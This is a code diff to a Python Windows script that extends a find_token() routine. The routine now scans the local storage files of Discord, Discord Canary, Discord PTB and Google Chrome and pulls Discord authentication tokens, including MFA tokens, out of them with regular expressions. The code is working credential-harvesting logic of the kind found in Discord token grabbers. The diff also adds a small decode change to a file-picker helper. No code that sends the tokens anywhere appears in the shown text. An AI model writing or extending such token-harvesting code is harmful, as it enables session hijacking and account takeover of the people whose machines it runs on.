@@ -56,24 +56,32 @@ def token_check(token):
     return change_message(token, None)
 
 def find_token():
-    path = os.getenv('APPDATA') + '\\Discord'
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default'
+    }
 
     tokens = []
 
-    if not os.path.exists(path):
-        print('[-] Discord not found!')
-        sys.exit(-1)
-
-    path += '\\Local Storage\\leveldb'
-
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+    for plaform, path in paths.items():
+        if not os.path.exists(path):
             continue
 
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
+        path += '\\Local Storage\\leveldb'
+
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+
+            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
 
     return tokens
 
@@ -92,7 +100,7 @@ def select_file():
     comdlg32 = windll.LoadLibrary('Comdlg32.dll')
     comdlg32.GetOpenFileNameA(byref(OpenFileName))
 
-    return lpstrFile.value.decode()
+    return lpstrFile.value.decode('utf-8')
 
 tokens = find_token()
 token = None
